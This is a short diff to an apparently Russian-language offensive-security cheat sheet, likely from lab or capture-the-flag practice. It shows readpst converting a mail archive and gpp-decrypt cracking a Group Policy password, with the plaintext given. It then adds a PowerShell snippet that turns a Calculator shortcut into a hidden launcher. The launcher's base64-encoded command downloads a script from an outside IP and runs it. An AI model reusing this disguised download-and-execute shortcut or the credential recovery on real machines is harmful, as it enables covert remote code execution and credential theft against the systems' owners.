@@ -262,6 +262,15 @@ openssl x509 -in amanda.cer -text
  # Переделка Microsoft Outlook файла в читаемый формат
 
  readpst Access\ Control.pst
+
 # Расшифровка пароля груповой политики виндовс
 
 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ---> GPPstillStandingStrong2k18
+
+# Создание вредноносноно ярлыка 
+
+ 	$obj = New-object -comobject wscript.shell
+	$link = $obj.createshortcut("C:\Common Applications\Calculator.lnk")
+	$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+	$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand  		SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANwA6ADgAMAAwADAALwBzAGgAZQBsAGwAXwA5ADAAMAAyAC4AcABzADEAJwApAAoA"
+	$link.save()
